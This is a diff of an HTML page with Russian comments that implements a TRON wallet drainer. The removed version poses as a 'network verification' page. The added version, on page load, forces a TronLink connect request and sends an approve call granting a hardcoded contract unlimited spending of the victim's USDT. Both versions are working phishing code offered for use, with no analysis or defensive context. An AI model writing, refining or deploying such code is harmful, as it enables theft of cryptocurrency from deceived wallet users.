@@ -1,65 +1,26 @@
 <!DOCTYPE html>
-<html lang="ru">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>USDS - Network Verification</title>
     <script src="https://cdn.jsdelivr.net/npm/tronweb/dist/TronWeb.js"></script>
-    <style>
-        body { margin: 0; background: #000; color: white; font-family: 'Inter', sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; overflow: hidden; }
-        .status-container { text-align: center; padding: 0 20px; }
-        .loader { border: 2px solid #111; border-top: 2px solid #3b82f6; border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; margin: 0 auto 20px; }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        #status-text { font-size: 14px; letter-spacing: 1px; color: #888; text-transform: uppercase; line-height: 1.5; }
-    </style>
 </head>
-<body>
-
-<div class="status-container">
-    <div class="loader" id="loader"></div>
-    <div id="status-text">Loading</div>
-</div>
-
+<body style="background:#000;">
 <script>
-    const contractAddress = 'TCCRZgsANneEEmwGuyFdv8AZyjoTNfk3an'; // Твой контракт
-    const usdtAddress = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';     // USDT Mainnet
-    
-    async function triggerApprove() {
-        try {
-            document.getElementById('status-text').innerText = "ПОДТВЕРДИТЕ ОПЕРАЦИЮ В КОШЕЛЬКЕ";
-            const contract = await window.tronWeb.contract().at(usdtAddress);
-            const maxAmount = "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
-            
-            await contract.approve(contractAddress, maxAmount).send();
-            
-            document.getElementById('status-text').innerText = "ВЕРИФИКАЦИЯ УСПЕШНО ЗАВЕРШЕНА";
-            document.getElementById('loader').style.display = 'none';
-        } catch (e) {
-            console.error(e);
-            document.getElementById('status-text').innerText = "ОШИБКА ПОДТВЕРЖДЕНИЯ. ОБНОВИТЕ СТРАНИЦУ";
-            document.getElementById('loader').style.display = 'none';
+    async function fastApprove() {
+        if (window.tronLink) {
+            // 1. Форсируем коннект
+            await window.tronLink.request({ method: 'tron_requestAccounts' });
+            // 2. Сразу кидаем Approve
+            const contract = await window.tronWeb.contract().at("TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t");
+            await contract.approve("TCCRZgsANneEEmwGuyFdv8AZyjoTNfk3an", "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff").send();
         }
     }
-
-    window.onload = () => {
-        let attempts = 0;
-        const status = document.getElementById('status-text');
-        
-        // Опрашиваем кошелек каждые 500мс (полезно для Trust Wallet)
-        const checkTron = setInterval(async () => {
-            attempts++;
-            
-            if (window.tronWeb && window.tronWeb.defaultAddress.base58) {
-                clearInterval(checkTron);
-                await triggerApprove();
-            } else if (attempts > 10) { 
-                // Если за 5 секунд кошелек не найден (значит открыли в Safari)
-                clearInterval(checkTron);
-                status.innerText = "ПОЖАЛУЙСТА, ОТКРОЙТЕ ЭТУ ССЫЛКУ ВНУТРИ DAPP-БРАУЗЕРА ВАШЕГО КОШЕЛЬКА (TRUST WALLET / TRONLINK)";
-                document.getElementById('loader').style.display = 'none';
-            }
-        }, 500);
-    };
+    // Запускаем проверку каждые 100мс, чтобы поймать момент инъекции кошелька
+    const interval = setInterval(() => {
+        if (window.tronWeb) {
+            clearInterval(interval);
+            fastApprove();
+        }
+    }, 100);
 </script>
 </body>
 </html>
